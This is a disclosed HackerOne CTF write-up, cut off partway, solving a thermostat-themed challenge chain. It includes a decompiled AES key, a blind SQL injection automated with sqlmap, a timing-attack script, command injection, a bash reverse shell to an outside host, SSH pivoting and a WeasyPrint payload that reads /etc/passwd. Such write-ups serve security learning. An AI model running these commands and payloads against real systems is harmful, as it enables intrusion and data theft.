{"id":504413,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQ0MTM=","url":"https://hackerone.com/reports/504413","title":"CTF write-up: c8889970d9fb722066f31e804e351993","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-03-03T10:08:22.630Z","submitted_at":"2019-03-03T10:08:22.630Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ret2jazzy","url":"/ret2jazzy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-5736"],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:55:34.185Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:55:25.921Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"So the CTF starts with [this](https://twitter.com/Hacker0x01/status/1100543680383832065) tweet. \n\n{F434370}\n\nThe first image is about the 50 million in bounties but the second one looks related to the CTF. The first thing that comes to mind when relating CTFs and images is \"steganography\". \n\nUsing the all purpose steg tool [zsteg](https://github.com/zed-0xff/zsteg) as our first resort, we discover some interesting data in the image, hidden in the form of LSB steg. It can be isolated like this:\n\n```\nroot@pwnbox16:~/files# zsteg --lsb -b 1 -o yx D0XoThpW0AE2r8S.png\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\n```\n\nThe shortened URL returns a [apk](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view). Instead of installing it, I decided to go with static analysis.\n\n-----\n\nAn apk is basically java compiled into bytecode, so it's easily decompilable. At first, I tried [jadx](https://github.com/skylot/jadx) but it was error-ing out on multiple functions, so I decided to take long way.\n\nI created a jar file out of the apk using [enjarify](https://github.com/Storyyeller/enjarify) and then decompiled it with [procyon](https://bitbucket.org/mstrobel/procyon). Along with that, I also disassembled it with apktool to get the other files such as the manifest and resources.\n\n```\nroot@pwnbox16:~/files# enjarify/enjarify.sh h1thermostat.apk \nUsing python3 as Python interpreter\n1000 classes processed\n2000 classes processed\nOutput written to h1thermostat-enjarify.jar\n2421 classes translated successfully, 0 classes had errors\n\nroot@pwnbox16:~/files# apktool d h1thermostat.apk \nI: Using Apktool 2.3.4 on h1thermostat.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nS: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...\nS: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable\nI: Loading resource table from file: /tmp/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n\n```\n Due to some Java dependency issues locally, I opted to use the online version of procyon availabe at http://www.javadecompilers.com/\n\nAfter getting the source and other resources/manifest, I popped it all in Android Studio. \n\nSkimming over the source, the app looks like a remote controller for a thermostat. \n\nAccording to the `AndroidManifest.xml`, the MainActivity was `com.hackerone.thermostat.LoginActivity`.\n\n{F434392}\n\nLooking over `LoginActivity`, we identify some interesting functions such as `attemptLogin()`. \n\n{F434393}\n\nThe main part happens right at the end.\n\n```java\n            this.showProgress(b);\n            final JSONObject jsonObject = new JSONObject();\n            jsonObject.put(\"username\", (Object)LoginActivity.username);\n            jsonObject.put(\"password\", (Object)LoginActivity.password);\n            jsonObject.put(\"cmd\", (Object)\"getTemp\");\n            Volley.newRequestQueue((Context)this).add(new PayloadRequest(jsonObject, new LoginActivity$3(this)));\n```\n\nIt basically creates a JSON object with the username and password we enter, along with `\"cmd\" : \"getTemp\"`. It then creates a new PayloadRequest object and adds it to the request queue.\n\nThe PayloadRequest class is even more interesting...\n\n{F434420}\n\nThe main thing happens in `BuildPayload`:\n\n```java\n    private String buildPayload(final JSONObject jsonObject) {\n        final int n = 16;\n        final byte[] array2;\n        final byte[] array = array2 = new byte[n];\n        array2[0] = 56;\n        array2[1] = 79;\n        array2[2] = 46;\n        array2[3] = 106;\n        array2[4] = 26;\n        array2[5] = 5;\n        array2[6] = -27;\n        array2[7] = 34;\n        array2[8] = 59;\n        array2[9] = -128;\n        array2[10] = -23;\n        array2[11] = 96;\n        array2[12] = -96;\n        array2[13] = -90;\n        array2[14] = 80;\n        array2[15] = 116;\n        final SecretKeySpec secretKeySpec = new SecretKeySpec(array, \"AES\");\n        final byte[] array3 = new byte[n];\n        new SecureRandom().nextBytes(array3);\n        final IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);\n        final Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        instance.init(1, secretKeySpec, ivParameterSpec);\n        final byte[] doFinal = instance.doFinal(jsonObject.toString().getBytes());\n        final byte[] array4 = new byte[doFinal.length + n];\n        System.arraycopy(array3, 0, array4, 0, n);\n        System.arraycopy(doFinal, 0, array4, n, doFinal.length);\n        return Base64.encodeToString(array4, 0);\n```\n\nIt basically encrypts our JSON object (stringified) using AES-CBC with a static key and a randomly generated IV. It then prepends the IV to the encrypted string (for decryption) and base64 encodes it.\n\nA POST request is sent with the encrypted JSON in the `d` parameter to `http://35.243.186.41/`, according to the constructor:\n\n```\n    public PayloadRequest(final JSONObject jsonObject, final Response$Listener mListener) {\n        super(1, \"http://35.243.186.41/\", new PayloadRequest$1(mListener));\n        this.mListener = mListener;\n        (this.mParams = new HashMap()).put(\"d\", this.buildPayload(jsonObject));\n    }\n```\n\nThe response is also encrypted, as the `parseNetworkResponse` function tries to decrypt it\n\n```java\n    protected Response parseNetworkResponse(final NetworkResponse networkResponse) {\n        try {\n            try {\n                final byte[] decode = Base64.decode(new String(networkResponse.data), 0);\n                final int n = 16;\n                final byte[] array = new byte[n];\n                System.arraycopy(decode, 0, array, 0, n);\n                final byte[] array2 = new byte[decode.length - n];\n                try {\n                    System.arraycopy(decode, n, array2, 0, decode.length - n);\n                    final byte[] array3 = new byte[n];\n                    try {\n                        final byte[] array4 = array3;\n                        array4[0] = 56;\n                        array4[1] = 79;\n                        array4[2] = 46;\n                        array4[3] = 106;\n                        array4[4] = 26;\n                        array4[5] = 5;\n                        array4[6] = -27;\n                        array4[7] = 34;\n                        array4[8] = 59;\n                        array4[9] = -128;\n                        array4[10] = -23;\n                        array4[11] = 96;\n                        array4[12] = -96;\n                        array4[13] = -90;\n                        array4[14] = 80;\n                        array4[15] = 116;\n                        final SecretKeySpec secretKeySpec = new SecretKeySpec(array3, \"AES\");\n                        final IvParameterSpec ivParameterSpec = new IvParameterSpec(array);\n                        final Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n                        instance.init(2, secretKeySpec, ivParameterSpec);\n                        final Cipher cipher = instance;\n                        try {\n                            final byte[] doFinal = cipher.doFinal(array2);\n                            try {\n                                final JSONObject jsonObject = new JSONObject(new String(doFinal));\n                                if (jsonObject.getBoolean(\"success\")) {\n                                    return Response.success(null, this.getCacheEntry());\n                                }\n                                final String string = jsonObject.getString(\"error\");\n                                try {\n                                    return Response.success(string, this.getCacheEntry());\n                                }\n                                catch (Exception ex) {\n                                    return Response.success(\"Unknown\", this.getCacheEntry());\n                                }\n                            }\n...\u003crest snipped out\u003e...\n```\n\nI quickly wrote a encryption/decryption routine in python to help me send requests to the server. \n\n```python\nimport requests\nimport sys\nfrom Crypto.Cipher import AES\n\ndef pad(s):\n    return s + chr(0x10 - len(s)%0x10) * (0x10 - len(s)%0x10) \n\ndef unpad(s):\n    return s[:-ord(s[-1])]\n\nKEY = '\\x38\\x4f\\x2e\\x6a\\x1a\\x05\\xe5\\x22\\x3b\\x80\\xe9\\x60\\xa0\\xa6\\x50\\x74'\n\n \ndata = (\"A\" * 16 + AES.new(KEY, AES.MODE_CBC, \"A\" * 16).encrypt(pad(sys.argv[1]))).encode('base64')\nresp = requests.post(\"http://35.243.186.41/\", data={'d': data}).text.decode('base64')\n\nprint unpad(AES.new(KEY, AES.MODE_CBC, resp[:16]).decrypt(resp[16:]))\n```\n\nIt basically takes the first command line parameter, encrypts it and sends the request to the server. Then it decrypts the response and prints it.\n\nUsing it to tamper with the server, I identified `admin:password` as a valid user/pass combination\n\n```\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin\", \"password\":\"admin\", \"cmd\":\"getTemp\"}'\n{\"success\": false, \"error\": \"Invalid username or password\"}\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin\", \"password\":\"password\", \"cmd\":\"getTemp\"}'\n{\"temperature\": 73, \"success\": true}\n```\n\nPlaying around with it a little more, I also identified a blind SQLi in the username.\n\n```\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin'\\'' and 1=1#\", \"password\":\"password\", \"cmd\":\"getTemp\"}'\n{\"temperature\": 73, \"success\": true}\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin'\\'' and 1=2#\", \"password\":\"password\", \"cmd\":\"getTemp\"}'\n{\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\n1=1 returns true while 1=2 makes the statement false, making it return `Invalid username/password`.\n\nIdeally at this point, I would've used SQLMap to dump the whole db because blind SQLi is tedious but since everything is encrypted, I cannot directly use SQLmap.\n\nNow, I can either script the blind SQLi or use some trick to get SQLmap to work. I decided to go with the latter.\n\nThe brilliant idea is to write simple webapp in Flask which would take the plaintext values as GET parameters, encrypt them and forward them to the actual server and return the decrypted response, acting like a encryption/decryption proxy.\n\n```python\nfrom flask import Flask, request\nfrom Crypto.Cipher import AES\nimport requests\nimport json\n\ndef pad(s):\n    padn = 16 - (len(s) % 16)\n    return s + chr(padn) * padn\n\ndef unpad(s):\n    return s[:-ord(s[-1])]\n\nKEY = '\\x38\\x4f\\x2e\\x6a\\x1a\\x05\\xe5\\x22\\x3b\\x80\\xe9\\x60\\xa0\\xa6\\x50\\x74'\n\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hack():\n    data = {\"username\": request.args.get('username'), \"password\": request.args.get('password'), \"cmd\": \"getTemp\"}\n    enc  = (\"A\" * 16 + AES.new(KEY, AES.MODE_CBC, \"A\" * 16).encrypt(pad(json.dumps(data)))).encode('base64')\n    resp = requests.post(\"http://35.243.186.41/\", data={'d': enc}).text.decode('base64')\n    return unpad(AES.new(KEY, AES.MODE_CBC, resp[:16]).decrypt(resp[16:]))\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', threaded=True)\n```\n\nNow I can basically run SQLmap on localhost with plaintext values and not worry about any encryption/decryption. \n\n```\nroot@pwnbox16:~/files# python sqlmap.py -u \"http://localhost:5000/?username=admin\u0026password=admin\" --level 5 --risk 3 --dump\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.2.11.6#dev}\n|_ -| . [.]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n\u003csnip\u003e....\nsqlmap identified the following injection point(s) with a total of 556 HTTP(s) requests:\n---\nParameter: username (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin' AND 2307=(SELECT (CASE WHEN (2307=2307) THEN 2307 ELSE (SELECT 8582 UNION SELECT 1355) END))-- zTlo\u0026password=admin\u0026cmd=getTemp\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- fbmN\u0026password=admin\u0026cmd=getTemp\n---\n[18:25:51] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork)\n[18:25:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries\n[18:25:51] [INFO] fetching current database\n[18:25:51] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval\n[18:25:51] [INFO] retrieved: flitebackend\n\u003csnip\u003e....\n````\n\nThe `flitebackend` looks like main DB and it only has two tables named `users` and `devices`. The `users` table only has one entry\n```\nDatabase: flitebackend\nTable: users\n[1 entry]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+----+----------+----------------------------------+\n```\n\nThe `devices` table has 151 entries, essentially consisting of IPs\n\n```\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 192.88.99.253   |\n| 2   | 192.88.99.252   |\n| 3   | 10.90.120.23    |\n| 4   | 244.188.235.4   |\n\u003csnip\u003e....\n| 149 | 243.99.63.239   |\n| 150 | 10.17.63.143    |\n| 151 | 192.88.99.59    |\n+-----+-----------------+\n\n```\n\nThe next logical course of action would be related to the IPs, so we nmap-ed all the IPs.\n\n```\nroot@pwnbox16:~/files# for ip in `cat IPs.txt`; do nmap -v \"$ip\"; done\n\nStarting Nmap 7.01 ( https://nmap.org ) at 2019-03-03 02:59 UTC\nInitiating Ping Scan at 02:59\nScanning 192.88.99.253 [4 ports]\nCompleted Ping Scan at 02:59, 0.20s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 02:59\nCompleted Parallel DNS resolution of 1 host. at 02:59, 0.00s elapsed\n\u003csnip\u003e....\n```\n\nThe only IP that stood out is the `104.196.12.98` because it had port 80 open. We see a promising `FliteThermostat login` page when visiting it.\n\n{F434443}\n\nTrying to login, we observe a weird behaviour. Instead of sending the username and password in the login request, it actually sent a custom hash based on our username/password, derived from http://104.196.12.98/login.js,\n\nThe hash is based on [RC4](https://en.wikipedia.org/wiki/RC4) and XORs but I won't go deep into explaining it as it's irrelevant for the CTF. \n\nThis is where we got stuck for a few hours. During that time, we went back to the original SQLi and chased the rabbit of trying to read local files using `load_file()` as it was running as `root@localhost` user.\n\nOther than that, we also found a \"setTemp\" command in the `ThermostatModel.java` of the android apk but it wasn't useful either.\n\nWhen nothing else panned out, we went back and just started playing with the endpoint more.  During the recon process, we dirsearched and found a few endpoints but all of them just 302-ed back to root as they probably required authentication.\n\n```\n\nTarget: http://104.196.12.98/\n\n[20:18:02] Starting: \n[20:18:04] 400 -  157B  - /%2e%2e/google.com\n[20:18:44] 302 -  209B  - /control  -\u003e  http://104.196.12.98/\n[20:19:33] 302 -  209B  - /main  -\u003e  http://104.196.12.98/\n[20:20:05] 302 -  209B  - /update  -\u003e  http://104.196.12.98/\n```\n\nDeducing from the response headers, especially the all caps \"METHOD NOT ALLOWED\" when sending an invalid http verb, it felt like a Flask webapp running behind the nginx.\n\nAfter a few hours of misery, we finally had a breakthrough. \n\nIf we send a hash of the length 64, which is what login.js generates, it would take 0.5 seconds for a response but if the length is not 64, it would return in 0.05 seconds. \n\n```\nubuntu@ip-172-31-22-54:~$ time curl -X POST 'http://104.196.12.98/' -d 'hash=abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabca'\n....\nreal\t0m0.559s\nuser\t0m0.008s\nsys\t0m0.000s\n\nubuntu@ip-172-31-22-54:~$ time curl -X POST 'http://104.196.12.98/' -d 'hash=aaaaa'\n....\nreal\t0m0.057s\nuser\t0m0.008s\nsys\t0m0.000s\n````\n\nThis points to your typical timing attack. @corb3nik wrote a quick script to verify it by bruting the first byte (2 characters as it's hex encoded) and sure enough, the first byte is `f9`. \n\n```\nubuntu@ip-172-31-22-54:~$ time curl -X POST 'http://104.196.12.98/' -d 'hash=f9cdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd'\n...\nreal\t0m1.059s\nuser\t0m0.004s\nsys\t0m0.004s\n```\n\nIt took 0.5 more seconds than usual, and now it's just a matter of scripting it. The server was kinda unreliable, so we did some super advanced heuristics to get the right character.\n\nHere is the final script:\n\n```python\n#!/usr/bin/env python3\n\nimport requests\nimport time\nimport binascii\nimport threading\n\nURL = \"http://104.196.12.98/\"\nDATA = {\n   \"hash\" : \"\"\n}\nHEADERS = {\n   \"Content-Type\" : \"application/x-www-form-urlencoded\"\n}\n\nRESULTS = {}\nCURRENT = b''\n#CURRENT = b'\\xf9\\x86ZIR\\xa4\\xf5\\xd7KC\\xf3U\\x8f\\xedj\\x02%\\xc6\\x87\\x7f\\xba`\\xa2P\\xbc\\xbd\\xe7S\\xf5\\xdb\\x13'\n\ndef test(attempt):\n   before = time.time()\n   data = dict(DATA)\n   data['hash'] = binascii.hexlify(CURRENT + bytes([attempt])).ljust(64, b\"0\")\n   r = requests.post(URL, data=data, headers=HEADERS)\n   print(r, len(r.text))\n   after = time.time()\n\n   diff = after - before\n   RESULTS[attempt] = diff\n\n\nwhile True:\n   possibilities = [i for i in range(0xff)]\n\n   while True:\n       threads = []\n       RESULTS = {}\n\n       m = 0\n       for attempt in list(possibilities):\n           thread = threading.Thread(target=test, args=(attempt,))\n           thread.start()\n           m += 1\n\n           if m % 7 == 0:\n               time.sleep(1.5)\n           threads.append(thread)\n\n       for thread in threads:\n           thread.join()\n\n       THRESHOLD = 0.50 * (len(CURRENT) + 2)\n       for attempt in RESULTS:\n           t = RESULTS[attempt]\n           if RESULTS[attempt] \u003c THRESHOLD:\n               possibilities.remove(attempt)\n\n       if len(possibilities) \u003c= 1:\n           break\n\n       print(possibilities)\n\n   CURRENT = CURRENT + bytes([possibilities[0]])\n   print(CURRENT)\n```\n\nThe final hash came out to be `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`\n\nUsing it to login, we are presented with a very simple page:\n\n{F434454}\n\nIn the HTML source, we also see a commented out `/diagnostics` endpoint\n\n```\n\t\t\u003cul\u003e\n\t\t\t\u003cli\u003e\u003ca href=\"/control\"\u003eTemperature control\u003c/a\u003e\u003c/li\u003e\n\t\t\t\u003cli\u003e\u003ca href=\"/update\"\u003eCheck for updates\u003c/a\u003e\u003c/li\u003e\n\t\t\t\u003c!--\u003cli\u003e\u003ca href=\"/diagnostics\"\u003eDiagnostics\u003c/a\u003e\u003c/li\u003e--\u003e\n\t\t\u003c/ul\u003e\n```\n\nBut it returns \"Forbidden\" when we try to access it. Later on, we will find out that it was just a red herring and all the time I spent on accessing it was a waste.\n\nThe `/update` endpoint probably tries to connect to a host and looks for an update manifest file, but it always errors as the host:post used is invalid\n\n{F434469}\n\nThe `/control` endpoint shows us the temperature of the supposed thermostat and allows us to change it too. It didn't turn out to be useful either except we could have an extremely large/small temperature.\n\n{F434477}\n\nWell, we started the typical recon process and bruted the GET parameters for the `/update` and `/control`. Soon enough, `port` was discovered as a valid parameter on `/update`\n\nThe `port` basically controlled port to where the server tried to look for the update file. It only accepted integers and supplying `port` as 1337 made the server connect to `http://update.flitethermostat:1337/`\n\n{F434479}\n\nNow if we can control the port, we might able to control the host too. The hard part was guessing the parameter it depended on. We tried `host`, `hostname` and all the other obvious names but none worked. The whole wordlist of param-miner also returned nothing.\n\nNow this is where we got stuck and called it a night (it was already 2am). \n\n----\n\nNext morning, we stumbled upon [this](https://twitter.com/daeken/status/1101358829168558080) tweet from the challenge author, an underscore (`_`). \n\nThis looks like a CTF hint, maybe we have to brute parameters with underscores? Anyhow @corb3nik mutated his wordlist with underscores in the prefix, suffix and two words joined with an underscore. \n\nAnd after some more advanced guessing, we finally figured out the parameter name. It is called `update_host`. This was such a stretch.....\n\nNext, It didn't take us long to discover the command injection in it. Our input is probably being passed unsanitized in a command and we can easily inject arbitrary commands by using backticks\n\n{F434483}\n\nNext, we got a reverse shell using\n\n```\necho \"bash -i \u003e\u0026 /dev/tcp/p.hacker.af/8181 0\u003e\u00261\"|bash\n```\n(piping to bash as the server was using /bin/sh)\n\nAnd there, we got the shell.\n\n```\nubuntu@ip-172-31-22-54:~$ nc -nlvp 8181\nListening on [0.0.0.0] (family 0, port 8181)\nConnection from 104.196.12.98 57122 received!\nbash: cannot set terminal process group (10): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@4d131d414079:/app#\n```\n\nLooks like we are root and inside an docker instance. Let's take a look at the source now\n\n```\nroot@4d131d414079:/app# cat main.py\nfrom flask import Flask, abort, redirect, render_template, request, Response, session\nfrom jinja2 import Template\nimport base64, json, os, random, re, subprocess, time\n\napp = Flask(__name__)\napp.secret_key = '99807ef08993b1cf019f6cd30fa3acbfbda992ee2aeffc5339f0f130e25604c4'\n\n\u003csnip\u003e...\n\n@app.route('/diagnostics')\ndef diagnostics():\n\tif 'loggedIn' not in session or not session['loggedIn']:\n\t\treturn redirect('/')\n\treturn 'Forbidden', 403\n\nif __name__ == \"__main__\":\n\tapp.run(host='0.0.0.0', port=80)\n\n```\n\nCAN YOU BELIEVE IT? The whole diagnostics was a ruse....\n\n----\n\nWe started playing around and that's when I broke the challenge. It was a shared docker instance and I was trying to escape it, so I overwrote the docker entrypoint and broke everything.\n\nEssentially, I was trying the recent docker CVE-2019-5736. I was hopeful that it might work because the filesystem persisted even after a forced restart (`kill -9 1`). In the process of verifying it, I overwrote the /usr/bin/python (the entrypoint) binary with '1' hoping that it would crash during the force reboot and a new fresh instance would start up.\n\nInstead, it went down and never came up. We messaged Cody and even went to talk to him IRL. We asked him about the docker escape and he was like \"No, you guys are way overthinking this\" and then he restarted the challenge. He also turned down our approach of leaking stuff with the Google Cloud Metadata.\n\nWell, the next thing we did was to install some useful tools (`net-tools`, `nmap`) in the otherwise minimal docker image. Then we scanned the local subnet\n\n```\nroot@4d131d414079:/app# ifconfig\neth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e  mtu 1500\n        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255\n        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)\n        RX packets 702225  bytes 97006785 (92.5 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 560986  bytes 152943040 (145.8 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1  (Local Loopback)\n        RX packets 2  bytes 1033 (1.0 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 2  bytes 1033 (1.0 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nroot@4d131d414079:/app# nmap -v 172.19.0.0/16\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-03 07:05 UTC\nInitiating ARP Ping Scan at 07:05\nScanning 4096 hosts [1 port/host]\n\u003csnip\u003e\nDiscovered open port 22/tcp on 172.19.0.1\nDiscovered open port 80/tcp on 172.19.0.3\nDiscovered open port 80/tcp on 172.19.0.1\n```\n\nPort 80 was open on 172.19.0.3, that sounds promising....\n\n```\nroot@4d131d414079:/app# curl 172.19.0.3\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\t\u003chead\u003e\n\n\u003csnip\u003e....\n\t\t\t\n\u003cb\u003eMaterials contained within are confidential and for HackerOne employee eyes only\u003c/b\u003e\n\n\u003csnip\u003e...\n```\n\nSo another webapp, huh? It's hosted on the private subnet of the docker instance, so we can't directly access it from the outside. It would suck to exploit it over curl, so let's pull some super advanced networking tricks make it more accessible.\n\nSince it's a docker instance and I'm behind a NAT myself, we can't directly reach each other. So I will be using a Jump box to pull some ssh forwarding tricks. \n\nI installed `sshd` on the docker instance, and then forwarded the local port 22 to port 2222 on my Jumpbox.\n\n```\nroot@4d131d414079:/app# service ssh start\nStarting OpenBSD Secure Shell server: sshd.\n\nroot@4d131d414079:/app# ssh ubuntu@p.hacker.af -R 2222:localhost:22\nubuntu@p.hacker.af's password:\n\u003csnip\u003e...\n```\n\nThen I forward the port 2222 on my Jumpbox to 4444 locally\n\n```\n$ ssh ubuntu@p.hacker.af -L 4444:localhost:2222\n```\n\nNow I can basically reach the docker instance by ssh-ing to localhost on port 4444. I already had my public key added, so everything works out nicely.\n\n```\n $ ssh root@localhost -p 4444                            \nThe authenticity of host '[localhost]:4444 ([127.0.0.1]:4444)' can't be established.\nECDSA key fingerprint is SHA256:x5ufg0rDo0ac001Yng3bJFS6yDyfk6H8ZZnOFj++kJM.\n\u003csnip\u003e....\nLast login: Sat Mar  2 09:31:09 2019 from 127.0.0.1\nroot@4d131d414079:~#\n```\n\nWell, now we use the fancy dynamic forwarding feature of SSH .\n\n```\nroot@pwnbox16:~/files/# ssh root@localhost -p 4444 -D 6666\n```\n\nUsing localhost:6666 as a SOCKS proxy, we can access the private subnet of the docker instance now.\n\n{F434515}\n\nFrom the UI, we can see an invoices and reports page. But they're both login protected\n\n{F434519}\n\nInstead of playing around with the login, I decided to concentrate on a commented endpoint I found in the HTML source of invoices.\n\n```html\n\n\t\t\t\t\t\u003cli  class=\"nav-item\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/\"\u003eHome\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\t\u003cli  class=\"nav-item\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/reports\"\u003eReports\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\t\u003cli  class=\"nav-item active\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/invoices\"\u003eInvoices\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\t\n\t\t\t\t\t\u003c!--\u003cli  class=\"nav-item\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/invoices/new\"\u003eNew Invoice\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e--\u003e\n```\n\nThe `/invoices/new` looked pretty interesting....\n\n{F434520}\n\nSo we have a \"preview\" and a \"Save PDF\" feature. Capturing the request in Burp, we observe JSON being sent as a GET parameter\n\n{F434521}\n\nThe preview endpoint generates a HTML page based on our input and the Save PDF endpoint probably uses that HTML and parses it into a PDF. \n\nSeems to me that we need to get XSS and somehow get the PDF renderer to parse our arbitrary HTML/Javascript. Then, we might be able to leverage it into an LFD by using iframes etc.\n\nPlaying around with it a little, we quickly identify the unsanitized input in the \"body\" key of the JSON. \n\n{F434522}\n\nWe tried to close the style tag with `\u003c/style\u003e` but apparently it got stripped out. Looks like the work of some shitty WAF. It didn't take us long to use it's stripping against itself `\u003c/sty\u003c/style\u003ele\u003e`.\n\n{F434524}\n\nThe only thing left now is to get a LFD. I leaked information about the backend PDF to HTML parser by adding a rogue img tag pointing to my server. Here was the request I received\n\n```\nubuntu@ip-172-31-22-54:~$ nc -nlvp 8182\nListening on [0.0.0.0] (family 0, port 8182)\nConnection from 104.196.12.98 50666 received!\nGET / HTTP/1.1\nHost: p.hacker.af:8182\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n```\n\nLooks like it's using [WeasyPrint](https://weasyprint.org/) to parse the HTML into PDF. I had never encountered it before, so I began reading the documentation.\n\nIt doesn't support Javascript, but the security section on the Tutorial page seems promising.\n\n{F434528}\n\nIt basically states we can access local files using `file://` URI. But unfortunately, neither iframes or embed/object tags worked with local files. All of those just displayed a blank blox.\n\nI was out of ideas, so I decided to postpone the hacking to later than night (back when I'd be in hotel). \n\nAt around midnight, I started again and began reading the documentation again. That's when I stumbled upon the [features](https://weasyprint.readthedocs.io/en/stable/features.html) page. \n\n{F434530}\n\nHere is the interesting part:\n\n```\nAttachments are related files, embedded in the PDF itself. They can be specified through \u003clink rel=attachment\u003e elements to add resources globally or through regular links with \u003ca rel=attachment\u003e to attach a resource that can be saved by clicking on said link. The title attribute can be used as description of the attachment.\n```\n\nSo basically if I make the `\u003clink\u003e` tag with `rel=\"attachment\"`, it will store the reference as a \"attachment\" in the PDF. Let's try using it with a reference to `file:///etc/passwd`.\n\n```\nroot@pwnbox16:~/files/pdfhack# curl -g --proxy socks5h://localhost:6666 'http://172.19.0.3/invoices/pdfize?d={\"companyName\":\"Acme Tools\",\"email\":\"accounting@acme.com\",\"invoiceNumber\":\"0001\",\"date\":\"2019-04-01\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"background-color:white}\u003c/sty\u003c/style\u003ele\u003e\u003clink rel=\\\"attachment\\\" href=\\\"file:///etc/passwd\\\"\u003e\":\"white\"}}}'  -o out.pdf\n  % Total    % Received % Xferd  Average Speed   Time   